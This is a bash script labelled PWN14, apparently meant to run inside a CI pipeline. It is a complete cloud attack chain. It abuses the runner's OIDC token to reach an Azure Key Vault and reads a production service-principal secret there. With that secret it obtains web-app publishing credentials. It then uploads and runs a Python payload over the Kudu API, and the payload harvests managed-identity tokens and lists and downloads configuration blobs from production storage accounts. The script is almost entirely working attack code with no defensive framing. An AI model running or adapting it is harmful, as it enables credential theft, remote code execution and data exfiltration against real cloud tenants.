#!/usr/bin/env bash
set +e
echo "=====PWN14_START====="
TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
OIDC=$(curl -sS -m 15 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" --data-urlencode "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" -d grant_type=client_credentials --data-urlencode "scope=https://vault.azure.net/.default" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
RJ=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4")
RID=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("appId",""))' 2>/dev/null)
RSC=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("clientSecret",""))' 2>/dev/null)
RAT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d "client_id=$RID" -d grant_type=client_credentials --data-urlencode "client_secret=$RSC" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
PC=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $RAT" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01")
PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
PP=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
echo "kudu=${PU:-FAIL}"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
cat > /tmp/z4.py <<'ZPY'
import os,json,urllib.request,urllib.error,urllib.parse,re,sys
OUT=open("/home/site/wwwroot/out14.txt","w")
def P(*a): print(*a,file=OUT,flush=True)
CID="7a85156a-01c4-4e61-8472-40a92107159b"
IH=os.environ.get("IDENTITY_HEADER") or "40dcfecb-3b2f-7086-721d-670bc5dafdf8"
IES=[os.environ.get("IDENTITY_ENDPOINT") or "http://169.254.131.2:8081/msi/token","http://169.254.131.5:8081/msi/token"]
def tok(ep,res,cid=None):
    q={"api-version":"2019-08-01","resource":res}
    if cid: q["client_id"]=cid
    req=urllib.request.Request(ep+"?"+urllib.parse.urlencode(q),headers={"X-IDENTITY-HEADER":IH})
    with urllib.request.urlopen(req,timeout=15) as r:
        return json.loads(r.read()).get("access_token","")
ST=""
for ep in IES:
    for cid in [CID,None,"eeab432e-1bf6-400e-b155-a28ce7cafcdb"]:
        try:
            ST=tok(ep,"https://storage.azure.com",cid)
            if ST: P("TOKEN_OK",ep,"cid",cid,"len",len(ST)); break
        except Exception as e: P("tok_err",ep,cid,str(e)[:90])
        if ST: break
    if ST: break
if not ST:
    P("NO_STORAGE_TOKEN"); OUT.close(); raise SystemExit
def get(url):
    req=urllib.request.Request(url,headers={"Authorization":"Bearer "+ST,"x-ms-version":"2021-08-06"})
    try:
        with urllib.request.urlopen(req,timeout=25) as r: return r.status,r.read()
    except urllib.error.HTTPError as e: return e.code,e.read()
    except Exception as e: return None,str(e).encode()
for sa in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz"]:
    for cont in ["config","internal","app-config","data","exports"]:
        c,b=get(f"https://{sa}.blob.core.windows.net/{cont}?restype=container&comp=list")
        if c==200:
            P(f"LIST {sa}/{cont} -> 200")
            for name in re.findall(rb'<Name>([^<]+)</Name>',b): P("  BLOBNAME:",name.decode())
        else:
            P(f"LIST {sa}/{cont} -> {c}",b[:150].decode('utf8','replace'))
        for blob in ["internal-config.json","config.json"]:
            c2,b2=get(f"https://{sa}.blob.core.windows.net/{cont}/{blob}")
            if c2==200:
                P(f"===== HIT {sa}/{cont}/{blob} ====="); P(b2.decode('utf8','replace')[:3000])
            else:
                P(f"GET {sa}/{cont}/{blob} -> {c2}")
P("DONE14"); OUT.close()
ZPY
curl -sS -m 30 -u "$PU:$PP" -X PUT "$SCM/api/vfs/site/wwwroot/z4.py" --data-binary @/tmp/z4.py -o /dev/null -w "vfs_put=%{http_code}\n"
curl -sS -m 170 -u "$PU:$PP" -H "Content-Type: application/json" -X POST "$SCM/api/command" -d '{"command":"python3 z4.py","dir":"/home/site/wwwroot"}' -o /dev/null 2>/dev/null
sleep 5
echo "=== OUT14 ==="
curl -sS -m 30 -u "$PU:$PP" "$SCM/api/vfs/site/wwwroot/out14.txt" | head -c 8000
echo
echo "=====PWN14_END====="